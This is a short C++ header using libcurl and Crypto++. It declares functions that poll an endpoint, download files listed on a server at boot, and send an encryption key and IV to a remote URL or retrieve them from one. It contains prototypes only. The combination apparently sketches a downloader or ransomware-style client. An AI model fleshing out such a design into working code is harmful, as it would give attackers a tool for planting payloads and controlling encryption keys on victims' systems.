#include "../../libs/libcurl/headers/curl.h"
#include <string>
#include <chrono>
#include <thread>
#include <iostream>
#include "../../libs/cryptopp/headers/secblock.h"

void requestEndpoint(const char* url, int sleepTime);
size_t writeCallback(void* ptr, size_t size, size_t nmemb, std::string* data);
std::vector<std::string> fetchFileList(const std::string& url);
void fetchAndDownloadFilesAtBoot(const std::string& fileListUrl, const std::string& fileBaseUrl);
void downloadFile(const std::string& url, const std::string& filePath);
void SendKeyAndIVToServer(const CryptoPP::SecByteBlock& key, const CryptoPP::SecByteBlock& iv, const std::string& url);
bool RetrieveKeyAndIV(const std::string& url, CryptoPP::SecByteBlock& key, CryptoPP::SecByteBlock& iv);